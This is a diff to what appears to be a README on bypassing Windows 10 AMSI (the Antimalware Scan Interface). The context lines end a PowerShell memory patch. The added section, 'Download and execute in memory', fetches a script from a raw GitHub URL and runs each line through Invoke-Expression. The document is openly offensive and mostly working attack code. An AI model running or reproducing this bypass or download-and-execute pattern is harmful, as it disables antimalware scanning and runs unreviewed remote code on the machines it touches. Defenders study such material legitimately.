@@ -27,6 +27,21 @@ $buf = New-Object byte[](8);
 $ptr= [System.IntPtr]::Add([System.IntPtr]$g, 0x8);
 [System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 8)
 ```
+
+<b>Download and execute in memory</b>
+```
+$url = 'https://raw.githubusercontent.com/MattSteedWork/Snip3/refs/heads/main/AMSIBypassWin10' 
+$response = Invoke-WebRequest -Uri $url -UseBasicParsing
+$content = $response.Content
+
+# Split the content into lines
+$lines = $content -split "`n"
+
+# Execute each line
+foreach ($line in $lines) {
+    Invoke-Expression $line
+}
+```
 # Whats actually happening here? (Short Win10 Version)
 
 <img width="959" alt="amsicontext2" src="https://github.com/user-attachments/assets/1d8e871a-e202-4bc7-850a-a6d0bdfcc73c">
